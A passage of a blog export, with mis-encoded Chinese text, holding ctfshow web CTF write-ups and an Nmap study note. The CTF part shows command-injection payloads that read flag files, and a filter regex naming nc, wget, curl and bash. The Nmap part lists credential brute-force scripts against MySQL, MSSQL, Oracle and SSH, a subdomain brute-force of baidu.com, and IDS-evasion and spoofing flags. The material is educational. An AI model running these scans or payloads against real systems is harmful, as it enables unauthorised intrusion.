<p>ä½¿ç”¨highlight_file()å‡½æ•°ã€‚<br>payloadï¼š<code>**GET** ?shell=flag.php  **POST**  CTF_SHOW=&amp;CTF[SHOW.COM=&amp;fun=highlight_file($_GET[shell]) </code></p>
<h2 id="web136"><a href="#web136" class="headerlink" title="web136"></a>web136</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">function</span> <span class="token function-definition function">check</span><span class="token punctuation">(</span><span class="token variable">$x</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/\\$|\.|\!|\@|\#|\%|\^|\&amp;|\*|\?|\&#123;|\&#125;|\>|\&lt;|nc|wget|system|bash|sh|netcat|grep|base64|rev|curl|wget|gcc|php|python|pingtouch|mv|mkdir|cp/i'</span><span class="token punctuation">,</span> <span class="token variable">$x</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'too young too simple sometimes naive!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token variable">$c</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token function">check</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">system</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">else</span><span class="token punctuation">&#123;</span>
    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token delimiter important">?></span></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>æ­£å¸¸payloadï¼š<br>?c&#x3D;cat &#x2F;f149_15_h3r3;<br>äº†è§£åˆ°ä¸€ä¸ªæ–°å‘½ä»¤<strong>tee</strong></p>
<p><img src="https://img-blog.csdnimg.cn/ef21c0b92cfa4020a35d2eecd96c810a.png" alt="1"><br><img src="https://img-blog.csdnimg.cn/155bbf7015c644e78f91879a196f54ff.png" alt="2"></p>
<p><strong>å¦ä¸€ä¸ªæ–¹æ³•</strong><br><a href="https://www.runoob.com/linux/linux-comm-sed.html">sedå‘½ä»¤</a><br><img src="https://img-blog.csdnimg.cn/bcf4813af45545da88e99629f676795d.png" alt="3"><br><a href="https://www.runoob.com/linux/linux-comm-xargs.html">xargså‘½ä»¤</a></p>
<h2 id="web138"><a href="#web138" class="headerlink" title="web138"></a>web138</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>

<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">class</span> <span class="token class-name-definition class-name">ctfshow</span>
<span class="token punctuation">&#123;</span>
    <span class="token keyword">function</span> <span class="token function-definition function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"private class"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">static</span> <span class="token keyword">function</span> <span class="token function-definition function">getFlag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">echo</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strripos</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'ctfshow'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">":"</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"private function"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token function">call_user_func</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'ctfshow'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>è¿‡æ»¤äº†::ï¼Œä¸èƒ½ç”¨ä¸Šé¢˜çš„<code>ctfshow=stfshow::getFlag</code>äº†ã€‚<br>call_user_funcå‡½æ•°åœ¨phpæ–‡æ¡£ä¸­è¿˜æœ‰æ€è·¯<br><img src="https://img-blog.csdnimg.cn/b1a697d445cb4291a8ff69bf33f07212.png" alt="1"><br>ä¹Ÿå°±æ˜¯è¯´call_user_funcå‡½æ•°å¯ä»¥ä¼ å…¥æ•°ç»„å‰é¢æ˜¯ç±»åï¼Œåé¢æ˜¯æ–¹æ³•åã€‚<br>payload<code>POST ctfshow[0]=ctfshow&amp;ctfshow[1]=getFlag</code><br><img src="https://img-blog.csdnimg.cn/85b359077b3f45c888d616edab8888af.png" alt="4"></p>
]]></content>
      <categories>
        <category>ctfshow</category>
      </categories>
      <tags>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title>Nmapå­¦ä¹ ç¬”è®°</title>
    <url>/2023/03/23/Nmap%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><meta name="referrer" content="no-referrer"/>

<h2 id="åŸºæœ¬æ“ä½œ"><a href="#åŸºæœ¬æ“ä½œ" class="headerlink" title="åŸºæœ¬æ“ä½œ"></a>åŸºæœ¬æ“ä½œ</h2><blockquote>
<p>nmap 0.0.0.0ï¼ˆæœ¬æœºIPï¼‰</p>
</blockquote>
<p>nmapé»˜è®¤å‘é€ä¸€ä¸ªarpçš„pingåŒ…ï¼Œæ¢æµ‹ç›®æ ‡ä¸»æœº0-1000çš„ç«¯å£ã€‚<a href="https://blog.csdn.net/qq_47125775/article/details/108433224">arpï¼ˆåœ°å€è§£æåè®®ï¼‰</a></p>
<blockquote>
<p>nmap ip ip<br> nmap 0.0.0.0 1.1.1.1</p>
</blockquote>
<p>å¿«é€Ÿæ‰«æå¤šä¸ªIP</p>
<blockquote>
<p>nmap -p (èŒƒå›´) IP<br> nmap -p 80,20-200 1.1.1.1</p>
</blockquote>
<p>æŒ‡å®šç«¯å£å’ŒèŒƒå›´è¿›è¡Œæ‰«æ</p>
<blockquote>
<p>nmap 192.168.227.1&#x2F;24 -exclude 192.168.227.1</p>
</blockquote>
<p>æ‰«æé™¤è¿‡æŸä¸€ä¸ªipå¤–çš„æ‰€æœ‰å­ç½‘ä¸»æœº</p>
<blockquote>
<p>nmap -sL 192.168.227.1&#x2F;24</p>
</blockquote>
<p>æ˜¾ç¤ºæ‰«æçš„æ‰€æœ‰ä¸»æœºçš„åˆ—è¡¨</p>
<blockquote>
<p>namp -sp 1.1.1.1-255</p>
</blockquote>
<p>æ‰«æå†…ç½‘çš„ä¸€ä¸ªIPèŒƒå›´(pingæ‰«æ)</p>
<blockquote>
<p>nmap -sS 1.1.1.1<br> Tcp SYN Scan (sS) è¿™æ˜¯ä¸€ä¸ªåŸºæœ¬çš„æ‰«ææ–¹å¼,å®ƒè¢«ç§°ä¸ºåŠå¼€æ”¾æ‰«æï¼Œå› ä¸ºè¿™ç§æŠ€æœ¯ä½¿å¾—Nmapä¸éœ€è¦é€šè¿‡å®Œæ•´çš„æ¡æ‰‹ï¼Œå°±èƒ½è·å¾—è¿œç¨‹ä¸»æœºçš„ä¿¡æ¯ã€‚Nmapå‘é€SYNåŒ…åˆ°è¿œç¨‹ä¸»æœºï¼Œä½†æ˜¯å®ƒä¸ä¼šäº§ç”Ÿä»»ä½•ä¼šè¯.å› æ­¤ä¸ä¼š<strong>åœ¨ç›®æ ‡ä¸»æœºä¸Šäº§ç”Ÿä»»ä½•æ—¥å¿—è®°å½•</strong>,å› ä¸ºæ²¡æœ‰å½¢æˆä¼šè¯ã€‚è¿™ä¸ªå°±æ˜¯SYNæ‰«æçš„ä¼˜åŠ¿.å¦‚æœNmapå‘½ä»¤ä¸­æ²¡æœ‰æŒ‡å‡ºæ‰«æç±»å‹,é»˜è®¤çš„å°±æ˜¯Tcp SYN.ä½†æ˜¯å®ƒéœ€è¦root&#x2F;administratoræƒé™ã€‚</p>
</blockquote>
<p>SYNåŠå¼€æ”¾æ‰«æ</p>
<blockquote>
<p>namp -sT 192.168.227.154<br> ä¸åŒäºTcp SYNæ‰«æ,Tcp connect()æ‰«æéœ€è¦å®Œæˆä¸‰æ¬¡æ¡æ‰‹,å¹¶ä¸”è¦æ±‚è°ƒç”¨ç³»ç»Ÿçš„connect().Tcp connect()æ‰«ææŠ€æœ¯<strong>åªé€‚ç”¨äºæ‰¾å‡ºTCPå’ŒUDPç«¯å£ã€‚</strong></p>
</blockquote>
<p>TCPæ‰«æ</p>
<blockquote>
<p>nmap -sU 192.168.206.124<br> è¿™ç§æ‰«ææŠ€æœ¯<strong>ç”¨æ¥å¯»æ‰¾ç›®æ ‡ä¸»æœºæ‰“å¼€çš„UDPç«¯å£</strong>.å®ƒä¸éœ€è¦å‘é€ä»»ä½•çš„SYNåŒ…ï¼Œå› ä¸ºè¿™ç§æŠ€æœ¯æ˜¯é’ˆå¯¹UDPç«¯å£çš„ã€‚UDPæ‰«æå‘é€UDPæ•°æ®åŒ…åˆ°ç›®æ ‡ä¸»æœºï¼Œå¹¶ç­‰å¾…å“åº”,å¦‚æœè¿”å›ICMPä¸å¯è¾¾çš„é”™è¯¯æ¶ˆæ¯ï¼Œè¯´æ˜ç«¯å£æ˜¯å…³é—­çš„ï¼Œå¦‚æœå¾—åˆ°æ­£ç¡®çš„é€‚å½“çš„å›åº”ï¼Œè¯´æ˜ç«¯å£æ˜¯å¼€æ”¾çš„.</p>
</blockquote>
<p>UDPæ‰«æ</p>
<blockquote>
<p>nmap -sV 192.168.206.135<br> ç‰ˆæœ¬æ£€æµ‹æ˜¯<strong>ç”¨æ¥æ‰«æç›®æ ‡ä¸»æœºå’Œç«¯å£ä¸Šè¿è¡Œçš„è½¯ä»¶çš„ç‰ˆæœ¬.å®ƒä¸åŒäºå…¶å®ƒçš„æ‰«ææŠ€æœ¯ï¼Œå®ƒä¸æ˜¯ç”¨æ¥æ‰«æç›®æ ‡ä¸»æœºä¸Šå¼€æ”¾çš„ç«¯å£ï¼Œä¸è¿‡å®ƒéœ€è¦ä»å¼€æ”¾çš„ç«¯å£è·å–ä¿¡æ¯æ¥åˆ¤æ–­è½¯ä»¶çš„ç‰ˆæœ¬.ä½¿ç”¨ç‰ˆæœ¬æ£€æµ‹æ‰«æä¹‹å‰éœ€è¦å…ˆç”¨TCPSYNæ‰«æå¼€æ”¾äº†å“ªäº›ç«¯å£ã€‚è¿™ä¸ªæ‰«æçš„è¯ï¼Œé€Ÿåº¦ä¼šæ…¢ä¸€äº›ï¼Œ67.86ç§’æ‰«ä¸€ä¸ªIP</strong>ã€‚</p>
</blockquote>
<p>Versionç‰ˆæœ¬æ‰«æ</p>
<blockquote>
<p>nmap -O 192.168.126.206</p>
</blockquote>
<p>OSæ“ä½œç³»ç»Ÿç±»å‹æ£€æµ‹</p>
<blockquote>
<p>nmap -O -PN 192.168.206.124<br> å¦‚æœè¿œç¨‹ä¸»æœºæœ‰é˜²ç«å¢™ï¼ŒIDSå’ŒIPSç³»ç»Ÿï¼Œä½ å¯ä»¥ä½¿ç”¨-PNå‘½ä»¤æ¥ç¡®ä¿ä¸pingè¿œç¨‹ä¸»æœºï¼Œå› ä¸ºæœ‰æ—¶å€™é˜²ç«å¢™ä¼šç»„ç»‡æ‰pingè¯·æ±‚.-PNå‘½ä»¤å‘Šè¯‰Nmapä¸ç”¨pingè¿œç¨‹ä¸»æœºã€‚ä½¿ç”¨-PNå‚æ•°å¯ä»¥ç»•è¿‡PINGå‘½ä»¤,ä½†æ˜¯ä¸å½±å“ä¸»æœºçš„ç³»ç»Ÿçš„å‘ç°ã€‚<br> è¿™ä¸ªæ‰«ææ•´ä¸ªcæ®µå±€åŸŸç½‘çš„è¯è¿˜æ˜¯æ¯”è¾ƒè€—æ—¶çš„ï¼Œä½†æ˜¯ä¿¡æ¯æ”¶é›†å¾ˆè¯¦ç»†ï¼Œå¤§æ¦‚è€—æ—¶9åˆ†é’Ÿã€‚</p>
</blockquote>
<p>NO ping æ‰«æ</p>
<blockquote>
<p>10.1.1.0&#x2F;24 &#x3D; 10.1.1.1-10.1.1.255 #cæ®µæ‰«æ<br> 10.1.1.0&#x2F;16 &#x3D; 10.1.1.1-10.1.255.255 #bæ®µæ‰«æ<br> 10.1.1.0&#x2F;8 &#x3D; 10.1.1.1-10.255.255.255 #aæ®µæ‰«æ</p>
</blockquote>
<p><strong>ç½‘æ®µæ‰«ææ ¼å¼</strong></p>
<blockquote>
<p>nmap -iL ip-address.txt</p>
</blockquote>
<p>ä»æ–‡ä»¶ä¸­è¯»å–éœ€è¦æ‰«æçš„åˆ—è¡¨</p>
<h2 id="nmapé«˜çº§ç”¨æ³•ä¹‹è„šæœ¬ä½¿ç”¨"><a href="#nmapé«˜çº§ç”¨æ³•ä¹‹è„šæœ¬ä½¿ç”¨" class="headerlink" title="nmapé«˜çº§ç”¨æ³•ä¹‹è„šæœ¬ä½¿ç”¨"></a>nmapé«˜çº§ç”¨æ³•ä¹‹è„šæœ¬ä½¿ç”¨</h2><p>MYSQLæš´åŠ›ç ´è§£</p>
<blockquote>
<p>nmap â€“script&#x3D;mysql-brute <target></p>
</blockquote>
<blockquote>
<p>3306&#x2F;tcp open  mysql<br> | mysql-brute:<br> |   Accounts<br> |     root:root - Valid credentials</p>
</blockquote>
<p>MsSQLè¿›è¡Œæš´åŠ›ç ´è§£</p>
<blockquote>
<p>nmap -p 1433 â€“script ms-sql-brute â€“script-args userdb&#x3D;customuser.txt,passdb&#x3D;custompass.txt <host></p>
</blockquote>
<blockquote>
<p>| ms-sql-brute:<br> |   [192.168.100.128\TEST]<br> |     No credentials found<br> |     Warnings:<br> |       sa: AccountLockedOut<br> |   [192.168.100.128\PROD]<br> |     Credentials found:<br> |       webshop_reader:secret &#x3D;&gt; Login Success<br> |       testuser:secret1234 &#x3D;&gt; PasswordMustChange<br> |_      lordvader:secret1234 &#x3D;&gt; Login Success</p>
</blockquote>
<p>å¯¹Oracleæ•°æ®åº“è¿›è¡Œæš´ç ´è§£</p>
<blockquote>
<p>nmap â€“script oracle-brute -p 1521 â€“script-args oracle-brute.sid&#x3D;ORCL <host></p>
</blockquote>
<blockquote>
<p>PORT     STATE  SERVICE REASON<br> 1521&#x2F;tcp open  oracle  syn-ack<br> | oracle-brute:<br> |   Accounts<br> |     system:powell &#x3D;&gt; Account locked<br> |     haxxor:haxxor &#x3D;&gt; Valid credentials<br> |   Statistics<br> |_    Perfomed 157 guesses in 8 seconds, average tps: 19</p>
</blockquote>
<p>å¯¹SSHè¿›è¡Œæš´åŠ›ç ´è§£</p>
<blockquote>
<p>nmap -p 22 â€“script ssh-brute â€“script-args userdb&#x3D;users.lst,passdb&#x3D;pass.lst â€“script-args ssh-brute.timeout&#x3D;4s <target></p>
</blockquote>
<blockquote>
<p>22&#x2F;ssh open  ssh<br> | ssh-brute:<br> |  Accounts<br> |    username:password<br> |  Statistics<br> |_   Performed 32 guesses in 25 seconds.</p>
</blockquote>
<p>åˆ©ç”¨DNSè¿›è¡Œå­åŸŸåæš´åŠ›ç ´è§£</p>
<blockquote>
<p>nmap â€“script dns-brute <a href="http://www.baidu.com/">www.baidu.com</a></p>
</blockquote>
<blockquote>
<p>Î» nmap â€“script dns-brute <a href="http://www.baidu.com/">www.baidu.com</a><br> Starting Nmap 7.50 ( <a href="https://nmap.org/">https://nmap.org</a> ) at 2017-07-25 13:12 ?<br> Nmap scan report for <a href="http://www.baidu.com/">www.baidu.com</a> (180.97.33.108)<br> Host is up (0.018s latency).<br> Other addresses for <a href="http://www.baidu.com/">www.baidu.com</a> (not scanned): 180.97.33.10<br> Not shown: 998 filtered ports<br> PORT    STATE SERVICE<br> 80&#x2F;tcp  open  http<br> 443&#x2F;tcp open  https<br> Host script results:<br> | dns-brute:<br> |   DNS Brute-force hostnames:<br> |     admin.baidu.com - 10.26.109.19<br> |     mx.baidu.com - 61.135.163.61<br> |     svn.baidu.com - 10.65.211.174<br> |     ads.baidu.com - 10.42.4.225<br> Nmap done: 1 IP address (1 host up) scanned in 92.64 seconds</p>
</blockquote>
<h2 id="å‚æ•°è¯¦è§£"><a href="#å‚æ•°è¯¦è§£" class="headerlink" title="å‚æ•°è¯¦è§£"></a>å‚æ•°è¯¦è§£</h2><p>Nmapæ”¯æŒä¸»æœºå,ip,ç½‘æ®µçš„è¡¨ç¤ºæ–¹å¼<br> ä¾‹å¦‚:blah.highon.coffee, namp.org&#x2F;24, 192.168.0.1;10.0.0-25.1-254</p>
<blockquote>
<p>-iL filename                    ä»æ–‡ä»¶ä¸­è¯»å–å¾…æ£€æµ‹çš„ç›®æ ‡,æ–‡ä»¶ä¸­çš„è¡¨ç¤ºæ–¹æ³•æ”¯æŒæœºå,ip,ç½‘æ®µ<br> -iR hostnum                     éšæœºé€‰å–,è¿›è¡Œæ‰«æ.å¦‚æœ-iRæŒ‡å®šä¸º0,åˆ™æ˜¯æ— ä¼‘æ­¢çš„æ‰«æ<br> â€“exclude host1[, host2]        ä»æ‰«æä»»åŠ¡ä¸­éœ€è¦æ’é™¤çš„ä¸»æœº<br> â€“exculdefile exclude_file      æ’é™¤æ–‡ä»¶ä¸­çš„IP,æ ¼å¼å’Œ-iLæŒ‡å®šæ‰«ææ–‡ä»¶çš„æ ¼å¼ç›¸åŒ</p>
</blockquote>
<p>ä¸»æœºå‘ç°</p>
<blockquote>
<p>-sL                     ä»…ä»…æ˜¯æ˜¾ç¤º,æ‰«æçš„IPæ•°ç›®,ä¸ä¼šè¿›è¡Œä»»ä½•æ‰«æ<br> -sn                     pingæ‰«æ,å³ä¸»æœºå‘ç°<br> -Pn                     ä¸æ£€æµ‹ä¸»æœºå­˜æ´»<br> -PS&#x2F;PA&#x2F;PU&#x2F;PY[portlist]  TCP SYN Ping&#x2F;TCP ACK Ping&#x2F;UDP Pingå‘ç°<br> -PE&#x2F;PP&#x2F;PM               ä½¿ç”¨ICMP echo, timestamp and netmask è¯·æ±‚åŒ…å‘ç°ä¸»æœº<br> -PO[prococol list]      ä½¿ç”¨IPåè®®åŒ…æ¢æµ‹å¯¹æ–¹ä¸»æœºæ˜¯å¦å¼€å¯<br> -n&#x2F;-R                   ä¸å¯¹IPè¿›è¡ŒåŸŸååå‘è§£æ&#x2F;ä¸ºæ‰€æœ‰çš„IPéƒ½è¿›è¡ŒåŸŸåçš„åå“è§£æ</p>
</blockquote>
<p>æ‰«ææŠ€å·§</p>
<blockquote>
<p>-sS&#x2F;sT&#x2F;sA&#x2F;sW&#x2F;sM                 TCP SYN&#x2F;TCP connect()&#x2F;ACK&#x2F;TCPçª—å£æ‰«æ&#x2F;TCP Maimonæ‰«æ<br> -sU                             UDPæ‰«æ<br> -sN&#x2F;sF&#x2F;sX                       TCP Nullï¼ŒFINï¼Œand Xmasæ‰«æ<br> â€“scanflags                     è‡ªå®šä¹‰TCPåŒ…ä¸­çš„flags<br> -sI zombie host[:probeport]     Idlescan<br> -sY&#x2F;sZ                          SCTP INIT&#x2F;COOKIE-ECHO æ‰«æ<br> -sO                             ä½¿ç”¨IP protocol æ‰«æç¡®å®šç›®æ ‡æœºæ”¯æŒçš„åè®®ç±»å‹<br> -b â€œFTP relay hostâ€             ä½¿ç”¨FTP bounce scan</p>
</blockquote>
<p>æŒ‡å®šç«¯å£å’Œæ‰«æé¡ºåº</p>
<blockquote>
<p>-p                      ç‰¹å®šçš„ç«¯å£ -p80,443 æˆ–è€… -p1-65535<br> -p U:PORT               æ‰«æudpçš„æŸä¸ªç«¯å£, -p U:53<br> -F                      å¿«é€Ÿæ‰«ææ¨¡å¼,æ¯”é»˜è®¤çš„æ‰«æç«¯å£è¿˜å°‘<br> -r                      ä¸éšæœºæ‰«æç«¯å£,é»˜è®¤æ˜¯éšæœºæ‰«æçš„<br> â€“top-ports â€œnumberâ€    æ‰«æå¼€æ”¾æ¦‚ç‡æœ€é«˜çš„numberä¸ªç«¯å£,å‡ºç°çš„æ¦‚ç‡éœ€è¦å‚è€ƒnmap-servicesæ–‡ä»¶,ubuntuä¸­è¯¥æ–‡ä»¶ä½äº&#x2F;usr&#x2F;share&#x2F;nmap.nmapé»˜è®¤æ‰«å‰1000ä¸ª<br> â€“port-ratio â€œratioâ€    æ‰«ææŒ‡å®šé¢‘ç‡ä»¥ä¸Šçš„ç«¯å£</p>
</blockquote>
<p>æœåŠ¡ç‰ˆæœ¬è¯†åˆ«</p>
<blockquote>
<p>-sV                             å¼€æ”¾ç‰ˆæœ¬æ¢æµ‹,å¯ä»¥ç›´æ¥ä½¿ç”¨-AåŒæ—¶æ‰“å¼€æ“ä½œç³»ç»Ÿæ¢æµ‹å’Œç‰ˆæœ¬æ¢æµ‹<br> â€“version-intensity â€œlevelâ€     è®¾ç½®ç‰ˆæœ¬æ‰«æå¼ºåº¦,å¼ºåº¦æ°´å¹³è¯´æ˜äº†åº”è¯¥ä½¿ç”¨å“ªäº›æ¢æµ‹æŠ¥æ–‡ã€‚æ•°å€¼è¶Šé«˜ï¼ŒæœåŠ¡è¶Šæœ‰å¯èƒ½è¢«æ­£ç¡®è¯†åˆ«ã€‚é»˜è®¤æ˜¯7<br> â€“version-light                 æ‰“å¼€è½»é‡çº§æ¨¡å¼,ä¸ºâ€“version-intensity 2çš„åˆ«å<br> â€“version-all                   å°è¯•æ‰€æœ‰æ¢æµ‹,ä¸ºâ€“version-intensity 9çš„åˆ«å<br> â€“version-trace                 æ˜¾ç¤ºå‡ºè¯¦ç»†çš„ç‰ˆæœ¬ä¾¦æµ‹è¿‡ç¨‹ä¿¡æ¯</p>
</blockquote>
<p>è„šæœ¬æ‰«æ</p>
<blockquote>
<p>-sC                             æ ¹æ®ç«¯å£è¯†åˆ«çš„æœåŠ¡,è°ƒç”¨é»˜è®¤è„šæœ¬<br> â€“script&#x3D;â€Lua scriptsâ€          è°ƒç”¨çš„è„šæœ¬å<br> â€“script-args&#x3D;n1&#x3D;v1,[n2&#x3D;v2]     è°ƒç”¨çš„è„šæœ¬ä¼ é€’çš„å‚æ•°<br> â€“script-args-file&#x3D;filename     ä½¿ç”¨æ–‡æœ¬ä¼ é€’å‚æ•°<br> â€“script-trace                  æ˜¾ç¤ºæ‰€æœ‰å‘é€å’Œæ¥æ”¶åˆ°çš„æ•°æ®<br> â€“script-updatedb               æ›´æ–°è„šæœ¬çš„æ•°æ®åº“<br> â€“script-help&#x3D;â€Lua scriptâ€      æ˜¾ç¤ºæŒ‡å®šè„šæœ¬çš„å¸®åŠ©</p>
</blockquote>
<p>OSè¯†åˆ«</p>
<blockquote>
<p>-O              å¯ç”¨æ“ä½œç³»ç»Ÿæ£€æµ‹,-Aæ¥åŒæ—¶å¯ç”¨æ“ä½œç³»ç»Ÿæ£€æµ‹å’Œç‰ˆæœ¬æ£€æµ‹<br> â€“osscan-limit  é’ˆå¯¹æŒ‡å®šçš„ç›®æ ‡è¿›è¡Œæ“ä½œç³»ç»Ÿæ£€æµ‹(è‡³å°‘éœ€ç¡®çŸ¥è¯¥ä¸»æœºåˆ†åˆ«æœ‰ä¸€ä¸ªopenå’Œclosedçš„ç«¯å£)<br> â€“osscan-guess  æ¨æµ‹æ“ä½œç³»ç»Ÿæ£€æµ‹ç»“æœ,å½“Nmapæ— æ³•ç¡®å®šæ‰€æ£€æµ‹çš„æ“ä½œç³»ç»Ÿæ—¶ï¼Œä¼šå°½å¯èƒ½åœ°æä¾›æœ€ç›¸è¿‘çš„åŒ¹é…ï¼ŒNmapé»˜è®¤è¿›è¡Œè¿™ç§åŒ¹é…<br> é˜²ç«å¢™&#x2F;IDSèº²é¿å’Œå“„éª—<br> -f; â€“mtu value                 æŒ‡å®šä½¿ç”¨åˆ†ç‰‡ã€æŒ‡å®šæ•°æ®åŒ…çš„MTU.<br> -D decoy1,decoy2,ME             ä½¿ç”¨è¯±é¥µéšè”½æ‰«æ<br> -S IP-ADDRESS                   æºåœ°å€æ¬ºéª—<br> -e interface                    ä½¿ç”¨æŒ‡å®šçš„æ¥å£<br> -g&#x2F; â€“source-port PROTNUM       ä½¿ç”¨æŒ‡å®šæºç«¯å£<br> â€“proxies url1,[url2],â€¦       ä½¿ç”¨HTTPæˆ–è€…SOCKS4çš„ä»£ç†</p>
</blockquote>
<blockquote>
<p>â€“data-length NUM               å¡«å……éšæœºæ•°æ®è®©æ•°æ®åŒ…é•¿åº¦è¾¾åˆ°NUM<br> â€“ip-options OPTIONS            ä½¿ç”¨æŒ‡å®šçš„IPé€‰é¡¹æ¥å‘é€æ•°æ®åŒ…<br> â€“ttl VALUE                     è®¾ç½®IP time-to-liveåŸŸ<br> â€“spoof-mac ADDR&#x2F;PREFIX&#x2F;VEBDOR  MACåœ°å€ä¼ªè£…<br> â€“badsum                        ä½¿ç”¨é”™è¯¯çš„checksumæ¥å‘é€æ•°æ®åŒ…<br> Nmap è¾“å‡º<br> -oN                     å°†æ ‡å‡†è¾“å‡ºç›´æ¥å†™å…¥æŒ‡å®šçš„æ–‡ä»¶<br> -oX                     è¾“å‡ºxmlæ–‡ä»¶<br> -oS                     å°†æ‰€æœ‰çš„è¾“å‡ºéƒ½æ”¹ä¸ºå¤§å†™<br> -oG                     è¾“å‡ºä¾¿äºé€šè¿‡bashæˆ–è€…perlå¤„ç†çš„æ ¼å¼,éxml<br> -oA BASENAME            å¯å°†æ‰«æç»“æœä»¥æ ‡å‡†æ ¼å¼ã€XMLæ ¼å¼å’ŒGrepæ ¼å¼ä¸€æ¬¡æ€§è¾“å‡º<br> -v                      æé«˜è¾“å‡ºä¿¡æ¯çš„è¯¦ç»†åº¦<br> -d level                è®¾ç½®debugçº§åˆ«,æœ€é«˜æ˜¯9<br> â€“reason                æ˜¾ç¤ºç«¯å£å¤„äºå¸¦ç¡®è®¤çŠ¶æ€çš„åŸå› <br> â€“open                  åªè¾“å‡ºç«¯å£çŠ¶æ€ä¸ºopençš„ç«¯å£<br> â€“packet-trace          æ˜¾ç¤ºæ‰€æœ‰å‘é€æˆ–è€…æ¥æ”¶åˆ°çš„æ•°æ®åŒ…<br> â€“iflist                æ˜¾ç¤ºè·¯ç”±ä¿¡æ¯å’Œæ¥å£,ä¾¿äºè°ƒè¯•<br> â€“log-errors            æŠŠæ—¥å¿—ç­‰çº§ä¸ºerrors&#x2F;waringsçš„æ—¥å¿—è¾“å‡º<br> â€“append-output         è¿½åŠ åˆ°æŒ‡å®šçš„æ–‡ä»¶<br> â€“resume FILENAME       æ¢å¤å·²åœæ­¢çš„æ‰«æ<br> â€“stylesheet PATH&#x2F;URL   è®¾ç½®XSLæ ·å¼è¡¨ï¼Œè½¬æ¢XMLè¾“å‡º<br> â€“webxml                ä»namp.orgå¾—åˆ°XMLçš„æ ·å¼<br> â€“no-sytlesheet         å¿½ç•¥XMLå£°æ˜çš„XSLæ ·å¼è¡¨</p>
</blockquote>
<p>å…¶ä»–nmapé€‰é¡¹</p>
<blockquote>
